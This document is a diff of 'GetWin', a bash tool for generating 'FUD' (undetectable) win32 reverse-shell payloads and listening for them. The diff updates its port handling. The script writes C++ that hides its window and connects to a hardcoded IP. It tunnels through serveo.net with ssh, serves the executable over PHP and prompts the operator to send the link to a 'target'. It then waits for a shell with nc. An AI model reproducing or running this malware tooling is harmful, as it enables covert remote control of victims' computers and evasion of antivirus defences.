@@ -1,5 +1,5 @@
 #!/bin/bash
-# GetWin v1.0
+# GetWin v1.1
 # FUD Payload Generator and Listener
 # Coded by @thelinuxchoice
 # Github: https://github.com/thelinuxchoice/getwin
@@ -14,7 +14,7 @@ printf "    \e[1;31m(_______)\e[0m          _   \e[1;31m(_)\e[0m\e[1;32m(_)\e[0m
 printf "    \e[1;77m _   ___  _____  _| |_  _  _  _  _  ____   \n"
 printf "    | | (_  || ___ |(_   _)| || || || ||  _ \  \n"
 printf "    | |___) || ____|  | |_ | || || || || | | | \n"
-printf "     \_____/ |_____)   \__) \_____/ |_||_| |_|v1.0 \e[0m\n"
+printf "     \_____/ |_____)   \__) \_____/ |_||_| |_|v1.1 \e[0m\n"
                                           
 printf "\n"
 printf "\e[1;77m.:.:\e[0m\e[1;93m FUD win32 payload generator and listener \e[0m\e[1;77m:.:.\e[0m\n"                              
@@ -52,14 +52,15 @@ exit 1; }
 }
 server() {
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-default_port2=$(seq 1111 4443 | sort -R | head -n1)
-ssh -o StrictHostKeyChecking=no -R $port:localhost:4444 serveo.net -R $default_port2:localhost:3333 > /dev/null 2>&1 &
-sleep 4
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 5
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send this link to the target:\e[0m\e[1;77m serveo.net:%s/%s.exe\e[0m\n' $default_port2 $payload_name
+ssh -o StrictHostKeyChecking=no -R 80:localhost:$port serveo.net -R $default_port3:localhost:$default_port2 2> /dev/null &
+sleep 3
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link above to target + /%s.exe:\e[0m\e[1;77m \n' $payload_name
+php -S localhost:$port > /dev/null 2>&1 &
+sleep 3
+printf "\n"
 printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting connection...\e[0m\n'
-nc -lvp 4444 
+printf "\n"
+nc -lvp $default_port2
 
 }
 
@@ -80,7 +81,9 @@ fi
 
 start() {
 
-default_port=$(seq 1111 4443 | sort -R | head -n1)
+default_port=$(seq 1111 4444 | sort -R | head -n1)
+default_port2=$(seq 1111 4444 | sort -R | head -n1)
+default_port3=$(seq 1111 4444 | sort -R | head -n1)
 printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
@@ -132,6 +135,7 @@ function generatePadding {
 }
 
 payload() {
+
 printf '#define _WINSOCK_DEPRECATED_NO_WARNINGS\n' > program.cpp
 printf '#include <winsock2.h>\n' >> program.cpp
 printf '#include <stdio.h>\n' >> program.cpp
@@ -150,7 +154,7 @@ printf ' ShowWindow (GetConsoleWindow(), SW_HIDE);\n' >> program.cpp
 printf ' WSAStartup(MAKEWORD(2,2),&wsaData);\n' >> program.cpp
 printf ' sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);\n' >> program.cpp
 printf ' sockcon.sin_family = AF_INET;\n' >> program.cpp
-printf ' sockcon.sin_port = htons(%s);\n' $port  >> program.cpp
+printf ' sockcon.sin_port = htons(%s);\n' $default_port3  >> program.cpp
 printf ' sockcon.sin_addr.s_addr = inet_addr("159.89.214.31");\n' >> program.cpp
 printf ' WSAConnect(sl, (SOCKADDR*)&sockcon,sizeof(sockcon),NULL,NULL,NULL,NULL);\n' >> program.cpp
 
